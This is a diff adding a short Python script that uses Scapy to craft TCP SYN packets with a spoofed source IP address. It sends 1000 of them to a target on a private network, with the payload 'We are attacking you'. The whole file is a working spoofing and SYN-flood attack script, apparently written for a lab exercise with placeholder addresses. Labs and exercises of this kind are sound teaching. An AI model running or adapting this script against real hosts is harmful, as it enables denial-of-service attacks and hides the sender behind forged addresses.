@@ -1,0 +1,22 @@
+from scapy.all import IP, TCP, send
+
+# Server IP and port
+server_ip = '192.168.1.14'  # Replace with the actual server IP
+server_port = 12345  # Replace with the actual server port
+
+# Define the target IP and port
+target_ip = "192.168.1.14"
+target_port = 12345
+
+# Spoofed source IP address
+spoofed_ip = "192.168.1.50"	#Replace with the IP you want to spoof
+
+# Message to send
+message = "We are attacking you"
+
+# Craft a TCP SYN packet with a spoofed source IP and a message in the payload
+packet = IP(src=spoofed_ip, dst=target_ip) / TCP(dport=target_port, flags="S") / message
+
+for _ in range(1000):
+    # Send the crafted packet using Scapy's send function
+    send(packet)
